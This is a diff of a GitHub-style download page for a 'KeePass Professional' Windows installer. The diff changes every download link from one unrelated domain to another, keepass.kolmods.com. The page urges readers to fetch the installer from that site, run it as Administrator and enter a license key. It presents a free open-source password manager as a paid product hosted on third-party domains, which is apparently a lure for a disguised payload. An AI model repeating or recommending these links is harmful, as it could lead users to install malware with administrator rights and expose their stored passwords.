@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **KeePass Professional** for Windows.
 
 <p align="center">
-  <a href="https://keepass.wonderchain.fun/">
+  <a href="https://keepass.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-KeePass%20Professional-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download KeePass Professional">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[keepass.wonderchain.fun](https://keepass.wonderchain.fun/)** |
-| **Full URL** | `https://keepass.wonderchain.fun/` |
+| **Direct link** | **[keepass.kolmods.com](https://keepass.kolmods.com/)** |
+| **Full URL** | `https://keepass.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — keepass.wonderchain.fun](https://keepass.wonderchain.fun/)** (link above)
+1. Click **[Download — keepass.kolmods.com](https://keepass.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://keepass.wonderchain.fun/"><strong>⬇ Download KeePass Professional now</strong></a></p>
+<p align="center"><a href="https://keepass.kolmods.com/"><strong>⬇ Download KeePass Professional now</strong></a></p>
 
 ---
 
